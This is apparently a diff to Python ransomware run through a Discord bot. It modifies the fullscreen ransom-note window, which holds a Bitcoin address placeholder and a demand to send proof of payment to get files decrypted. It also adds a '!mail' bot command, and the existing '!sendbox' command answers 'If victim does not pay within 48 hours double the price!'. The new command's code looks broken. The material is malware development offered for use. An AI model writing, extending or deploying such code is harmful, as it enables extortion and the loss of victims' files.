@@ -103,6 +103,7 @@ def dec_fun(key,file):
         pass
 
 
+
 def spam_messagebox():
 
     root= tk.Tk()
@@ -148,14 +149,14 @@ def spam_messagebox():
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
 
-
-    label1 = tk.Label(root, text='YOUR_BTC_ADDRESS_HERE') # Change this to your BTC address
-    label1.config(font=('helvetica', int(height/50))) # Size
-    label1.config(background='black', foreground='red') # Colors
-    canvas1.create_window(int(width/2), int(height/20)*13, window=label1)
+    
+    labelBTC = tk.Label(root, text=f'YOUR_BTC_ADDRESS_HERE') # Change this to your BTC address
+    labelBTC.config(font=('helvetica', int(height/50))) # Size
+    labelBTC.config(background='black', foreground='red') # Colors
+    canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
                                                 # *13 means how far down the canvas the subtitle is!
 
-    label1 = tk.Label(root, text='and then send proof of transfer to YOUR_NAME_HERE on Discord to get your files decrypted') # Change YOUR_NAME_HERE to your contact name
+    label1 = tk.Label(root, text=f'and then send proof of transfer to YOUR_EMAIL_HERE to get your files decrypted') # Change mail@mail.com to your contact name
     label1.config(font=('helvetica', int(height/50)))
     label1.config(background='black', foreground='red')
     canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
@@ -173,7 +174,6 @@ def spam_messagebox():
     
     root.attributes('-fullscreen', True) # Set fullscreen || SET TO TRUE
     root.mainloop()
-
 
 
 def between_callback(client):
@@ -413,23 +413,18 @@ async def on_message(message):
 
 
         if message.content == "!sendbox":
-                    await message.channel.send("Sent message to user! ```If victim does not pay within 48 hours double the price!```")
-                    spam_messagebox()
+            await message.channel.send("Sent message to user! ```If victim does not pay within 48 hours double the price!```")
+            spam_messagebox()
+
+
+        if message.content == "!mail":
+            config(labelBTC)
+            await message.channel.send("Successfully changed mail on message box")
 
 
         if message.content == "!help":
-
             await message.channel.send("https://pastebin.com/GaJbwS3Y **Key for pastebin is** ```3xcst-ZbtU$AMMz8rW}bDk3&e```")
 
-            # import os
-            # temp = (os.getenv('TEMP'))
-            # f5 = open(temp + r"\helpmenu.txt", 'a')
-            # f5.write(str(helpmenu))
-            # f5.close()
-            # temp = (os.getenv('TEMP'))
-            # file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
-            # await message.channel.send("Command successfully executed", file=file)
-            # os.system(r"del %temp%\helpmenu.txt /f")
 
 
 
@@ -470,6 +465,13 @@ async def on_message(message):
             else:
                 await message.channel.send("Unrecognized command or no output was obtained :(")
                 status = None
+
+
+
+
+
+
+
 
 
             
